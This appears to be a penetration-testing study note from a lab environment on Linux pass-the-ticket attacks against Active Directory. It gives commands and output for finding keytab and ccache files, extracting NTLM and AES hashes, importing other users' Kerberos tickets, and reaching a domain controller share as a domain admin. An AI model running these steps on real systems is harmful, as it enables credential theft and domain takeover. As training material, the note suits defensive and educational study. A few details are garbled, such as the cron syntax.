# Linux PtT

## Kerberos and Linux

Even if it's less common, Linux machines can also connect to Active Directory, but here's the take: it is not mandatory for a Linux machine to ==join== the domain in order to use Kerberos, as they can use Kerberos Tickets in scripts or to authenticate to the network.

Windows and Linux machines both request TGTs and TGSs in the same manner, but the difference is in ==storing these tickets==. On Linux, it highly depends on the distribution in use but in general, they are stored in two file types:

1. **ccache files:** files residing in **/tmp** directory with read and write protections. The environment variable KRB5CCNAME identifies if the tickets are in-use or the default location is changed. ==**A user with elevated privileges has access to these tickets.**==
2. **keytab files:** These files, used to authenticate the user to various services in the current session without a password, contain pairs of Kerberos principles and encrypted keys which are related with the Kerberos password. It is important to note that the keytab files need to be changed after each password change. These files are commonly used in scripts to access files stored in the Windows share folder without human interaction. They do not depend on the system in which they were created on, so they're portable to use in other computers.

***

## Identifying AD within Linux

### 1- realme Tool

```bash
$realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

### 2- Look for sssd and winbind processes

sssd and winbind are tools used for integrating AD within Linux.

```bash
ps -ef | grep -i "winbind\|sssd"
```

***

## Finding Kerberos Tickets

### Hunting for Keytab Files

**Remember that to use keytab files you need read and write permissions.**

**File extension lookup**

```shell
find / -name *keytab* -ls 2>/dev/null
```

**Cronjobs**

```shell
$crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

kinit allows interaction with Kerberos and works on requesting the user's TGT and store it in ccache file. This is a ==**target**==.

Since the tickets are represented as keytab files in the Linux environment, we will try to gain access to these files found by default on **/etc/krb5.keytab**.

We will use kinit to import a keytab into our session and act as the user. In the case above, the script is importing svc\_workstation.kt which belongs to svc\_workstation@INLANEFREIGHT.HTB.

### Hunting for ccache files

While theyre still valid, of course, we can abuse these ccache files to impersonate a user. But first let's find them:

```bash
ls -la /tmp

krb5cc_647401106_tBswau
krb5cc_647401107_Gf415d
krb5cc_647402606_qd2Pfh
```

***

## Abusing keytab files

We will use two methods.

* The first one will give us access to specific shared folders in the context of the victim.
* The second one will give us access to his entire account if we can perform a PtH with an NTLM hash, forge our own tickets with Rubeus using his AES Hash or cracking them :3 .

### Method 1: Importing Tickets

We need to know to which user this KeyTab file belongs to and then abuse it.

#### Extract valuable information from KeyTab files

```bash
$klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

#### Impersonating a user with KeyTab

```bash
$klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
```

This confirms that we're using David's ticket.

**IMPORTANT: Before importing another user's ticket we should make a copy of the current session's ticket and not lose it later. The ticket resides by default in the KRB5CCNAME environment variable**

Now let's import carlos' ticket:

```bash
$kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

```bash
$klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

By now, we can now act as carlos and access whatever shares intended for him.

```bash
$smbclient //dc01/carlos -k -c ls
```

### Method 2: KeyTabExtract tool

```bash
$python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

It is important to note that a single keytab file can contain various information about several and different users. All in one file. Good for us. If we successfully crack the password, we can login as the victim, and obtain even more hashes through other keytab files that are being used by scripts or cronjobs. As an example:

> Carlos has a cronjob that uses a keytab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.

```bash
$su - carlos@inlanefreight.htb
$ klist 
Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

***

## Abusing ccache files

These files are located in `/tmp` and needs `read+write` permissions to abuse them. So we need to escalate to root in order to get whatever we need about the ccache file's owner.

```bash
root#ls -la /tmp

-rw-------  1 julio@inlanefreight.htb            krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           krb5cc_647402606_ZX6KFA
```

To gain valuable intel on the victim, we can look at the groups that our target belongs to and maybe aim for the ones administrative rights of course. If one belongs to the local admins group, we will indeed get access to the DC host. Juicy enough!

```shell-session
root@linux01:~# id julio@inlanefreight.htb

<SNIP>647400512(domain admins@inlanefreight.htb)<SNIP>
```

### Importing the ccache File to the Current Session

Checking what ccache files are loaded:

```shell-session
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
```

**Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

Making a copy of the ccache file to use and importing it:

```shell-session
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

Checking the importation:

```shell-session
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
```

We successfully imported to ccache file to the current session, now we can access to the victim's (Julio in the example above.) Now we can access the victim's shares:

```shell-session
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
```

***
